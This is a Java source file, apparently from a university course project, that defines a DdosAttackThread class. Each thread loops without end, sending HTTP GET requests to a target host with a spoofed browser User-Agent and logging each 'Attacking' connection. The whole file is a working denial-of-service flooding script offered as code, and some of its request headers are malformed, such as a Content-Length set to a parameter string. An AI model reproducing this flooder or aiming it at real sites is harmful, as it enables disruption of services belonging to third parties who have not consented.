package edu.csupomona.cs480.data;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;


public class DdosAttackThread extends Thread
{
	String urlString = null;
	String param = null;
	int threadNumber;
	int connectionNumber = 0;
	
	final URL url;

	
	
	public DdosAttackThread (String urlStr, int num) throws Exception
	{
		urlString = "http://" + urlStr;
		url = new URL(urlString);		
		threadNumber = num;
		param = "param1=" + URLEncoder.encode("87845", "UTF-8");
	}


	@Override public synchronized void run()
	{


		while (!Thread.interrupted())
		{		
			connectionNumber++;
			
			try {
				HttpURLConnection connection = (HttpURLConnection) url
						.openConnection();
				connection.setDoOutput(true);
				connection.setDoInput(true);
				connection.setRequestMethod("GET");
				connection.setRequestProperty("charset", "utf-8");
				connection.setRequestProperty("Host", this.urlString);
				connection
						.setRequestProperty("User-Agent",
								"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
				connection.setRequestProperty("Content-Type",
						"application/x-www-form-urlencoded");
				connection.setRequestProperty("Content-Length", param);
				connection.getInputStream();
				
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			System.out.println("Attacking " + urlString 
					+ " with Connection #" + connectionNumber + " on Thread #" + threadNumber);
			
		}	// end while true
	}
}